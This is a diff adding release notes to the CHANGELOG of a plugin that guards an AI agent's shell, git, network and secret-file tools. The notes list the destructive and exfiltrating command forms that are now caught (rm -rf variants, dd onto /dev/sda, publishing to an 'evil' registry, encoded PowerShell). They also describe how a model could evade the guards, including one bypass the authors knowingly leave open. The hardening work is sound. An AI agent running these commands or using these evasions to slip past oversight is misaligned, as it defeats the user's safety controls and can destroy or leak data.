@@ -4,6 +4,173 @@ All notable changes to this project are documented here.
 
 The project follows [Semantic Versioning](https://semver.org/).
 
+## [1.5.0] - 2026-09-19
+
+### Added
+
+- **Plugin-owned blocking confirmation channel** — a new `confirm/stream` SSE endpoint and `confirm/respond` POST route that bypasses the session's `/permission` policy entirely. When enabled, all five safety guards (`readonly`, `protect-secrets`, `dangerous-shell`, `no-destructive-git`, `no-network`) now offer their `ask` action through a browser-based confirmation card instead of the native approval prompt. This solves the `danger-full-access` permission preset bug where `ask` guards were silently rejected without user interaction.
+  - The confirmation card shows the full command text (for shell tools) or bounded JSON arguments (for other tools), the guard reason, and clear `Allow once` / `Deny` buttons.
+  - The card is always mounted in the composer UI, even when the main toggle panel is closed.
+  - Confirmation requests block the `tools/pre-execute` listener until answered, with infinite wait (only `AbortSignal` cancellation resolves it).
+  - When no browser is subscribed for a session (headless mode), the guard falls back to its legacy behavior (`deny` stays `deny`, `ask` stays `ask`).
+
+- **P0 security hardening** — fixed 20 verified bypasses in the safety guards:
+  - `protect-secrets`: Now inspects `grep.include` and `glob.pattern` fields, not just `file_path` and `path`. Matches secret names case-insensitively (`.ENV`, `.Env`) on Windows.
+  - `dangerous-shell`: Now asks on `rm --recursive --force`, `rm -RF`, and `dd of=/dev/sda if=/dev/zero` (any argument order).
+  - `no-destructive-git`: Now asks on `git push --mirror`, `git push origin --delete`, and `git -C /repo push --force`.
+  - `no-network`: Now asks on `npm --registry=http://evil publish` (global options before `publish`).
+  - `dangerous-shell`: Now asks on PowerShell parameter abbreviations (`Remove-Item -Re -Fo`) and `powershell -ExecutionPolicy Bypass -EncodedCommand`.
+
+### Changed
+
+- **Security model**: All five safety guards now use the plugin-owned confirmation channel when available, making them independent of the session's approval policy.
+- **UI**: The confirmation card is now always visible in the composer input area, providing immediate feedback for blocked calls.
+
+### Fixed
+
+- **Bug**: `danger-full-access` permission preset caused `ask` guards to be silently rejected instead of prompting the user.
+- **Bug**: `protect-secrets` guard missed secret files when accessed via `grep.include` or `glob.pattern`.
+- **Bug**: `dangerous-shell` guard missed `rm` commands with long-form flags (`--recursive --force`) and uppercase flags (`-RF`).
+- **Bug**: `dangerous-shell` guard missed `dd` commands where `of=` appeared before `if=`.
+- **Bug**: `dangerous-shell` guard missed PowerShell encoded commands with valued prefix options (`-ExecutionPolicy Bypass`).
+
+### Security
+
+- **Authentication**: All HTTP routes now enforce the official `connection.requestRejection()` authentication seam for browser-originated requests.
+- **CSRF Protection**: All POST endpoints (`/set`, `/set-many`, `/confirm/respond`) now reject non-JSON content types.
+- **CORS Protection**: The `/confirm/stream` SSE endpoint now validates the `Origin` header and rejects cross-origin requests.
+
+### Documentation
+
+- Updated README.md and README.zh-CN.md with details about the new confirmation channel and P0 hardening.
+- Updated CHANGELOG.md with comprehensive release notes.
+
+## [1.4.0] - 2026-09-12
+
+### Fixed
+
+- **The `no-network` guard never intercepted `web_fetch`.** Its direct-network
+  tool set was `new Set(['web_search', 'read_page'])`, but no DSH release has
+  ever registered a tool named `read_page`: `dsh-tool-web` registers `web_search`
+  and `web_fetch` (verified in the installed 0.1.5-rc.2 packages, and in the
+  0.1.1-rc.2 and 0.1.2-rc.1 tarballs pulled from npm — the same two names in
+  all three). The guard row still rendered as ACTIVE and still counted hits,
+  while every URL fetch ran without a confirmation prompt. This is a fail-open
+  in a safety control, the worst direction for one. The set now names
+  `web_fetch`. The name came from a remembered API rather than a read one; two
+  tests now pin every tool name the guards list to the registered DSH set and
+  reject `read_page` if it reappears.
+
+- **All five shell-content guards ignored `pwsh`.** Every content-inspecting
+  preset gated on `name === 'bash'`, but `pwsh` is a registered tool
+  (`dsh-tool-pwsh`; `dsh-tool-pwsh-persistent` registers the same `pwsh` name)
+  that carries PowerShell source in the same `command` parameter. A model running
+  under a Windows profile could bypass every shell guard by using PowerShell
+  instead of bash — including `dangerous-shell`, `protect-secrets`, and
+  `no-network`. The five call sites
+  now share one `SHELL_TOOLS = ['bash', 'pwsh']` gate through a single
+  `shellCommandMatches()` helper, so the presets cannot drift apart on which
+  shell they cover again; a test asserts no preset reintroduces a bare
+  `name === 'bash'`. PowerShell-specific patterns were added where PowerShell
+  spells a dangerous action differently (`Set-Content`/`Out-File`/`New-Item`
+  writes, `Remove-Item -Recurse -Force`, `Format-Volume`, `Clear-Disk`,
+  `Stop-Computer`, `Invoke-WebRequest`/`Invoke-RestMethod`/`Start-BitsTransfer`);
+  commands both shells share (git, curl, npm publish) match through the existing
+  patterns on either tool. `SECRET_PATH` now also accepts `\` as a path
+  separator, since a PowerShell command carries native Windows paths
+  (`$env:USERPROFILE\.aws\credentials`).
+
+- **`readonly` blocked reading a file through `str_replace_editor`.** That tool
+  is one registration whose `command` parameter selects the action (enum:
+  `view`, `create`, `str_replace`, `insert`), and denying it by name also denied
+  its read-only `view` — so read-only mode stopped the model from inspecting a
+  file through the editor, the opposite of the preset's purpose. It is now
+  judged per command: `view` passes, the three mutating commands deny, and an
+  absent, empty, or unrecognized `command` denies rather than passing, because a
+  safety preset must not widen when it cannot classify a call. The set also
+  listed a standalone `create` tool that does not exist in any DSH release
+  (`create` is only that enum value), so it matched nothing.
+
+- The guard descriptions in both panel languages advertised the same phantom
+  `read_page` name and the same bash-only scope, so the UI told users the guard
+  covered things it did not. Both dictionaries now name the real tools and both
+  shells, and a test asserts the descriptions cannot reintroduce `read_page`.
+
+Two aliases were deliberately left UNmatched after checking PowerShell's own
+`InitialSessionState.cs`: `sc` maps to `Set-Content` only under `#if !CORECLR`
+and `ac` only under `#if !UNIX`. The `pwsh` tool prefers PowerShell 7 (Core,
+where neither alias exists) but `resolvePwshPath` falls back to
+`SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe` — Windows PowerShell
+5.1, which is NOT CoreCLR and DOES register `sc` → `Set-Content` — and an
+explicit `pwshPath` config is trusted as-is. So on a 5.1 host `sc a b` writes a
+file that readonly will not catch; that bypass is accepted deliberately, not
+overlooked. Matching `sc` on the PowerShell 7 path would deny `sc query spooler`
+(the real read-only service-control program) and matching `ac` on Linux/macOS
+would deny the native connect-time accounting command, also read-only. Both are
+non-recoverable DENY-path false positives traded against a bypass that needs a
+5.1 host to reach. A test records the tradeoff, including the 5.1 caveat.
+
+The PowerShell patterns match cmdlet names unanchored, consistent with the
+pre-existing bash patterns (`echo "tee x"` and `# sed -i f` have always been
+denied by `readonly`). Anchoring names to a statement position was tried first
+and rejected: it produced verified fail-opens that a real model reaches —
+`$x = Set-Content a b`, `& "Set-Content" a b`, `$(Out-File a)`,
+`Get-Process | Set-Content a` all slipped through. The tradeoff is a cheap false
+positive when a cmdlet name appears inside quoted text, which is the tradeoff the
+bash side already made. Only the SHORT aliases keep a statement anchor
+(`ni`/`clc`/`epcsv` for writes, `rm`/`del`/`ri`/`rmdir`/`erase`/`rd` for
+deletes), since those are the names short enough to collide with ordinary
+identifiers or flag text — `$ni = 1` must not be denied, and `Remove-Variable
+del -Force` must not be read as a delete. That anchor admits `=` so the
+assignment-RHS shape is covered for short and long names alike. The distinctive
+long names stay unanchored. Word boundaries mean `\brm\b` does not match inside
+`rmdir`, so each alias is listed explicitly; the alias set was checked against
+PowerShell's own `InitialSessionState.cs` alias table.
+
+Deletion cmdlets stay flag-qualified — `Remove-Item` and its aliases need
+`-Recurse` or `-Force` — so a plain single-file delete passes on both shells,
+matching `rm file.txt` on bash. The flag gap accepts a PowerShell backtick line
+continuation, so a delete split across lines with a trailing backtick is still
+caught.
+
+Each shell now sees only its own syntax patterns. The five presets previously
+shared one flat pattern list through `shellCommandMatches()`, which applied the
+PowerShell patterns to bash calls too: `grep -rn "Set-Content" CHANGELOG.md` was
+hard-denied by `readonly`, and those very strings are documented in this
+CHANGELOG. The helper takes a per-shell map instead. Patterns for shell-agnostic
+external commands (`tee`, `sed -i`, `dd`, `mkfs`, `chmod 777`, `curl|sh`) are
+still shared with `pwsh`, because PowerShell runs those programs too — scoping
+them to bash alone was verified to open seven fail-opens, including `tee
+out.txt` and `dd if=/dev/zero of=/dev/sda` on the DENY path.
+
+`pwsh -EncodedCommand <base64 UTF-16LE>` hides its payload from every
+content-inspecting preset, including the two DENY ones, so `protect-secrets`
+could be exfiltrated as an unreadable blob. The bash analogue
+(`echo <b64> | base64 -d | bash`) was already caught by the `| bash` arm,
+leaving pwsh strictly weaker. The evasion vector itself is now confirmed on the
+pwsh path rather than pretending to decode the payload. The pattern matches a
+prefix chain of `-e`/`-en`/…/`-EncodedCommand` directly on the `pwsh` or
+`powershell` executable, so it catches the abbreviated forms too; an open
+`-e[a-z]*` tail was rejected because it fired on `-eq` (the equality operator),
+`-ErrorAction`, `-Encoding`, and `-ea`, which are ubiquitous and would have asked
+on ordinary PowerShell. The flags are required to follow the executable, so an
+`-eq` inside a `-Command "…"` string does not match.
+
+Tests went from 173 to 197.
+
+### Changed
+
+- `readonly` no longer denies `str_replace_editor` calls whose `command` is
+  `view`. A session that had turned the preset on to stop edits also stops
+  editor-based reads from now on being blocked; every mutating command is still
+  denied.
+
+### Install
+
+```bash
+dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.4.0
+```
+
 ## [1.3.2] - 2026-09-12
 
 ### Fixed
